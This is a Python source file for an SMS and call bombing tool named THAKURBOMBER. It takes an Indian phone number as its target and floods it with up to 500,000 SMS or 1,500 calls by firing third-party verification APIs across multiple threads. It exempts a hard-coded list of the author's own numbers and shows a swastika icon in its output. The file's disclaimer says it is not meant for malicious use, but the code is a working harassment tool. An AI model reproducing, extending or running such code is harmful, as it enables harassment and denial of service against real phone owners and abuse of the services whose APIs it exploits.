#!/usr/bin/python

import os, subprocess, sys, shutil
import string, re, random, json
import time, threading
import argparse

from termcolor import colored
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed



try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (import error) ")
    print("Type `pip3 install -r requirements.txt` to install all required packages")
    sys.exit(1)


def prRed(prt): print("\033[93m {}\033[00m" .format(prt))
def prGreen(prt): print("\033[92m {}\033[00m" .format(prt))
def prYellow(prt): print("\033[93m {}\033[00m" .format(prt))
def prLightPurple(prt): print("\033[94m {}\033[00m" .format(prt))
def prPurple(prt): print("\033[95m {}\033[00m" .format(prt))
def prCyan(prt): print("\033[96m {}\033[00m" .format(prt))
def prLightGray(prt): print("\033[97m {}\033[00m" .format(prt))
def prBlack(prt): print("\033[98m {}\033[00m" .format(prt))


sthakur = [7987910488,7987910489,7987910490,7987910491,7987910492,7987910493,7987910494,7987910495,7987910496,7987910497,7987910498,7987910499,7987910500,
7987910501,
7987910502,
7987910503,
7987910504,
7987910505,
7987910506,
7987910507,
7987910508,
7987910509,
7987910510,
7987910511,
7987910512,
7987910513,
7987910514,
7987910515,
7987910516,
7987910517,
7987910518,
7987910519,
7987910520,
7987910521,
7987910522,
7987910523,
7987910524,
7987910525,
7987910526,
7987910527,
7987910528,
7987910529,
7987910530,
7987910531,
7987910532,
7987910533,
7987910534,
7987910535,
7987910536,
7987910537,
7987910538,
7987910539,
7987910540,
7987910541,
7987910542,
7987910543,
7987910544,
7987910545,
7987910546,
7987910547,
7987910548,
7987910549,
7987910550,
7987910551,
7987910552,
7987910553,
7987910554,
7987910555,
7987910556,
7987910557,
7987910558,
7987910559,
7987910560,
7987910561,
7987910562,
7987910563,
7987910564,
7987910565,
7987910566,
7987910567,
7987910568,
7987910569,
7987910570,
7987910571,
7987910572,
7987910573,
7987910574,
7987910575,
7987910576,
7987910577,
7987910578,
7987910579,
7987910580,
7987910581,
7987910582,
7987910583,
7987910584,
7987910585,
7987910586,
7987910587,
7987910588,
7987910589,
7987910590,
7987910591,
7987910592,
7987910593,
7987910594,
7987910595,
7987910596,
7987910597,
7987910598,
7987910599]

class Icons(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
        self.MADE = Style.BRIGHT + Fore.CYAN + "[ 卐 ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ ➡ ]" + Style.RESET_ALL
        self.TRGM = Style.BRIGHT + Fore.BLUE + "[ ➡ ]" + Style.RESET_ALL
        self.ADMS = Style.BRIGHT + Fore.RED + "\n[ ☠ ]" + Style.RESET_ALL
        self.STDS = "     "

class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ FAIL ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
        self.MADE = Style.BRIGHT + Fore.CYAN + "[ MADEBY ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
        self.TRGM = Style.BRIGHT + Fore.BLUE + "[ TARGET ]" + Style.RESET_ALL
        self.ADMS = Style.BRIGHT + Fore.RED + "[ ☠ ]" + Style.RESET_ALL
        self.STDS = "           "

class MessageDecorator(object):
    def __init__(self, attr):
        ICON = Icons()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.MADE = ICON.MADE
            self.STDS = ICON.STDS
            self.TRGM = ICON.TRGM
            self.ADMS = ICON.ADMS
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.MADE = STAT.MADE
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS
            self.TRGM = STAT.TRGM
            self.ADMS = STAT.ADMS

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " " + Style.RESET_ALL + RequestMessage)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " " + Style.RESET_ALL + RequestMessage)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)

    def MadeBy(self, RequestMessage):
        print(self.MADE + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)
        
    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET_ALL + RequestMessage
        
    def TargetMessage(self, RequestMessage):
        return self.TRGM + " " + Style.RESET_ALL + RequestMessage

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " " + Style.RESET_ALL + RequestMessage)
        
    def AdminMessage(self, RequestMessage):
        print(self.ADMS + " " + Style.RESET_ALL + Fore.RED + RequestMessage)


class APIProvider:

    api_providers=[]
    delay = 0
    status = True

    def __init__(self,cc,target,mode,delay=0):
        with open('api.json', 'r') as file:
            PROVIDERS = json.load(file)
        self.config = None
        self.cc = cc
        self.target = target
        self.mode = mode
        self.index = 0
        self.lock = threading.Lock()
        APIProvider.delay = delay
        providers=PROVIDERS.get(mode.lower(),{})
        APIProvider.api_providers = providers.get(cc,[])
        if len(APIProvider.api_providers)<10:
            APIProvider.api_providers+=providers.get("multi",[])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc)
        self.config = json.loads(config_dump)

    def select_api(self):
        try:
            self.index = random.choice(range(len(APIProvider.api_providers)))
        except IndexError:
            self.index=-1
            return
        self.config = APIProvider.api_providers[self.index]
        perma_headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"}
        if "headers" in self.config:
            self.config["headers"].update(perma_headers)
        else:
            self.config["headers"]=perma_headers
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except:
            return False

    def request(self):
        self.select_api()
        if not self.config or self.index==-1:
            return None
        identifier=self.config.pop("identifier","").lower()
        del self.config['name']
        self.config['timeout']=30
        response=requests.request(**self.config)
        return identifier in response.text.lower()

    def hit(self):
        try:
            if not APIProvider.status:
                return
            time.sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response==False:
                self.remove()
            elif response==None:
                APIProvider.status=False
            return response
        except:
            response=False
        finally:
            self.lock.release()
            return response



def readisdc():
    with open("countrycodes.json") as file:
        countrycodes = json.load(file)
    return countrycodes

def get_version():
    try:
        return open(".version","r").read().strip()
    except:
        return '5.5'

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def bann_text():
    clr()
    logo="""
████████╗██╗  ██╗ █████╗ ██╗  ██╗██╗   ██╗██████╗   
╚══██╔══╝██║  ██║██╔══██╗██║ ██╔╝██║   ██║██╔══██╗  
   ██║   ███████║███████║█████╔╝ ██║   ██║██████╔╝  
   ██║   ██╔══██║██╔══██║██╔═██╗ ██║   ██║██╔══██╗  
   ██║   ██║  ██║██║  ██║██║  ██╗╚██████╔╝██║  ██║  
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝         
     """
    version="Version: "+__VERSION__
    contributors="MADE BY: "+" ".join(__CONTRIBUTOR__)
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    
    mesgdcrt.MadeBy(contributors)
    print()


def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        bann_text()
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)

def format_phone(num):
    num=[n for n in num if n in string.digits]
    return ''.join(num).strip()

def do_zip_update():
    success=False

    # Download Zip from git
    # Unzip and overwrite the current folder

    if success:
        mesgdcrt.SuccessMessage("THAKURBOMBER was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update THAKURBOMBER.")
        mesgdcrt.WarningMessage("Grab The Latest one From https://github.com/Hackersthakur/STHAKURBOMBER.git")

    sys.exit()

def do_git_update():
    success=False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL,end='')
        process = subprocess.Popen("git checkout . && git pull ", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL,end='')
            time.sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("THAKURBOMBER was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update THAKURBOMBER.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print("git checkout . && git pull https://github.com/Hackersthakur/STHAKURBOMBER HEAD")
    sys.exit()

def update():
    if shutil.which('git'):
        do_git_update()
    else:
        do_zip_update()
def check_for_updates():
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get("https://raw.githubusercontent.com/Hackersthakur/STHAKURBOMBER/main/.version").text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("THAKURBOMBER is up-to-date")
        mesgdcrt.GeneralMessage("Starting THAKURBOMBER\n")
        
        mesgdcrt.WarningMessage("ONLY INDIAN NUMBERS ALLOWED")


def get_phone_info():
    while True:
        target = ""
        cc = "91"
        cc = format_phone(cc)
        if not country_codes.get(cc,False):
            mesgdcrt.WarningMessage("The country code ({cc}) that you have entered is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.TargetMessage("Enter the target number: +" + cc + " "))
        target = format_phone(target)
        
        if (int(target) == int(sthakur[0])
        or int(target) == int(sthakur[1])
        or int(target) == int(sthakur[2])
        or int(target) == int(sthakur[3])
        or int(target) == int(sthakur[4])
        or int(target) == int(sthakur[5])
        or int(target) == int(sthakur[6])
        or int(target) == int(sthakur[7])
        or int(target) == int(sthakur[8])
        or int(target) == int(sthakur[9])
        or int(target) == int(sthakur[10])
        or int(target) == int(sthakur[11])
        or int(target) == int(sthakur[12])
        or int(target) == int(sthakur[13])
        or int(target) == int(sthakur[14])
        or int(target) == int(sthakur[15])
        or int(target) == int(sthakur[16])
        or int(target) == int(sthakur[17])
        or int(target) == int(sthakur[18])
        or int(target) == int(sthakur[19])
        or int(target) == int(sthakur[20])
        or int(target) == int(sthakur[21])
        or int(target) == int(sthakur[22])
        or int(target) == int(sthakur[23])
        or int(target) == int(sthakur[24])
        or int(target) == int(sthakur[25])
        or int(target) == int(sthakur[26])
        or int(target) == int(sthakur[27])
        or int(target) == int(sthakur[28])
        or int(target) == int(sthakur[29])
        or int(target) == int(sthakur[30])
        or int(target) == int(sthakur[31])
        or int(target) == int(sthakur[32])
        or int(target) == int(sthakur[33])
        or int(target) == int(sthakur[34])
        or int(target) == int(sthakur[35])
        or int(target) == int(sthakur[36])
        or int(target) == int(sthakur[37])
        or int(target) == int(sthakur[38])
        or int(target) == int(sthakur[39])
        or int(target) == int(sthakur[40])
        or int(target) == int(sthakur[41])
        or int(target) == int(sthakur[42])
        or int(target) == int(sthakur[43])
        or int(target) == int(sthakur[44])
        or int(target) == int(sthakur[45])
        or int(target) == int(sthakur[46])
        or int(target) == int(sthakur[47])
        or int(target) == int(sthakur[48])
        or int(target) == int(sthakur[49])
        or int(target) == int(sthakur[50])
        or int(target) == int(sthakur[51])
        or int(target) == int(sthakur[52])
        or int(target) == int(sthakur[53])
        or int(target) == int(sthakur[54])
        or int(target) == int(sthakur[55])
        or int(target) == int(sthakur[56])
        or int(target) == int(sthakur[57])
        or int(target) == int(sthakur[58])
        or int(target) == int(sthakur[59])
        or int(target) == int(sthakur[60])
        or int(target) == int(sthakur[61])
        or int(target) == int(sthakur[62])
        or int(target) == int(sthakur[63])
        or int(target) == int(sthakur[64])
        or int(target) == int(sthakur[65])
        or int(target) == int(sthakur[66])
        or int(target) == int(sthakur[67])
        or int(target) == int(sthakur[68])
        or int(target) == int(sthakur[69])
        or int(target) == int(sthakur[70])
        or int(target) == int(sthakur[71])
        or int(target) == int(sthakur[72])
        or int(target) == int(sthakur[73])
        or int(target) == int(sthakur[74])
        or int(target) == int(sthakur[75])
        or int(target) == int(sthakur[76])
        or int(target) == int(sthakur[77])
        or int(target) == int(sthakur[78])
        or int(target) == int(sthakur[79])
        or int(target) == int(sthakur[80])
        or int(target) == int(sthakur[81])
        or int(target) == int(sthakur[82])
        or int(target) == int(sthakur[83])
        or int(target) == int(sthakur[84])
        or int(target) == int(sthakur[85])
        or int(target) == int(sthakur[86])
        or int(target) == int(sthakur[87])
        or int(target) == int(sthakur[88])
        or int(target) == int(sthakur[89])
        or int(target) == int(sthakur[90])
        or int(target) == int(sthakur[91])
        or int(target) == int(sthakur[92])
        or int(target) == int(sthakur[93])
        or int(target) == int(sthakur[94])
        or int(target) == int(sthakur[95])
        or int(target) == int(sthakur[96])
        or int(target) == int(sthakur[97])
        or int(target) == int(sthakur[98])
        or int(target) == int(sthakur[99])
        or int(target) == int(sthakur[100])
        or int(target) == int(sthakur[101])
        or int(target) == int(sthakur[102])
        or int(target) == int(sthakur[103])
        or int(target) == int(sthakur[104])
        or int(target) == int(sthakur[105])
        or int(target) == int(sthakur[106])
        or int(target) == int(sthakur[107])
        or int(target) == int(sthakur[108])
        or int(target) == int(sthakur[109])):
            logo="""
██╗      ██████╗ ██╗     ██╗
██║     ██╔═══██╗██║     ██║
██║     ██║   ██║██║     ██║
██║     ██║   ██║██║     ╚═╝
███████╗╚██████╔╝███████╗██╗
╚══════╝ ╚═════╝ ╚══════╝╚═╝       
     """
            
            mesgdcrt.AdminMessage("you can't run SMS Bombing to admin's Number")
            print(random.choice(ALL_COLORS) + logo)
            continue
           
        
        elif ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage("The phone number ({target}) that you have entered is invalid".format(target=target))
            continue
        
        return (cc,target)
      
             



def pretty_print(cc,target,success,failed):
    requested = success+failed
    contacts="hackersthakurindia@gmail.com"
    logo="""
████████╗██╗  ██╗ █████╗ ██╗  ██╗██╗   ██╗██████╗   
╚══██╔══╝██║  ██║██╔══██╗██║ ██╔╝██║   ██║██╔══██╗  
   ██║   ███████║███████║█████╔╝ ██║   ██║██████╔╝  
   ██║   ██╔══██║██╔══██║██╔═██╗ ██║   ██║██╔══██╗  
   ██║   ██║  ██║██║  ██║██║  ██╗╚██████╔╝██║  ██║  
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝         
     """
    print(random.choice(ALL_COLORS) + logo)
    mesgdcrt.SectionMessage("Bombing is in progress")
    
    mesgdcrt.GeneralMessage("Target       : " + cc +" "+ target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    
    mesgdcrt.SuccessMessage("THAKURBOMBER was created by HACKER STHAKUR")
    mesgdcrt.GeneralMessage("Contact : "+ random.choice(ALL_COLORS) + contacts)

def workernode(mode,cc,target,count,delay,max_threads):

    api = APIProvider(cc,target,mode,delay=delay)
    
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber")
    
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count) )
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) + " seconds")
    
    print()
    input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers)==0:
        mesgdcrt.FailureMessage("Your country/target is not supported as of now")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        
        bann_text()
        sys.exit()

    success,failed=0,0
    while success<count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result==None:
                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                                     
                    bann_text()
                    sys.exit()
                if result:
                    success+=1
                else:
                    failed+=1
                clr()
                pretty_print(cc,target,success,failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    bann_text()
    sys.exit()

def selectnode(mode="sms"):
    mode=mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()
        check_for_updates()
        

        max_limit={"sms":500000,"call":1500}
        cc,target="",""
        if mode in ["sms","call"]:
            cc,target=get_phone_info()
            if cc!="91":
                max_limit.update({"sms":100})
      
        else:
            raise KeyboardInterrupt


        limit=max_limit[mode]
        while True:
            try:
                message=("Enter number of {type} to send (Max {limit}): ").format(type=mode.upper(),limit=limit)
                count = 50000
                if count > limit or count==0:
                    mesgdcrt.WarningMessage("You have requested " + str(count) + " {type}".format(type=mode.upper()))
                    mesgdcrt.GeneralMessage("Automatically capping the value to {limit}".format(limit=limit))
                    count = limit
                delay = 1
                # delay = 0
                max_threads = 10
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode,cc,target,count,delay,max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()

if sys.version_info[0]!=3:
    mesgdcrt.FailureMessage("THAKURBOMBER will work only in Python v3")
    sys.exit()

try:
    country_codes = readisdc()["countrycodes"]
except FileNotFoundError:
    update()

mesgdcrt = MessageDecorator("icon")


__VERSION__ = get_version()
__CONTRIBUTOR__ = ['HACKERSTHAKUR']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

description="""THAKURBOMBER - Your Friendly Spammer Application

THAKURBOMBERcan be used for many purposes which incudes - 
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

THAKURBOMBER is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,epilog='Coded by HACKER S THAKUR !!!')
parser.add_argument("-sms","--sms", action="store_true",help="start THAKURBOMBER with SMS Bomb mode")
parser.add_argument("-call","--call", action="store_true",help="start THAKURBOMBER with CALL Bomb mode")

parser.add_argument("-u","--update", action="store_true",help="update THAKURBOMBER")
parser.add_argument("-c","--contributors", action="store_true",help="show current THAKURBOMBER contributors")
parser.add_argument("-v","--version", action="store_true",help="show current THAKURBOMBER version")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print("Version: ",__VERSION__)
    elif args.contributors:
        print("Contributors: "," ".join(__CONTRIBUTOR__))
    elif args.update:
        update()

    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice=""
        avail_choice={"1":"SMS","2":"CALL"}
        try:
            while (not choice in avail_choice):
                clr()
                bann_text()
                prRed("Choose One Option:\n")
                for key,value in avail_choice.items():
                    prPurple("[ {key} ] {value} BOMBER".format(key=key,value=value))
                print()
                choice=input(mesgdcrt.CommandMessage("Select Bombing Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:        
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
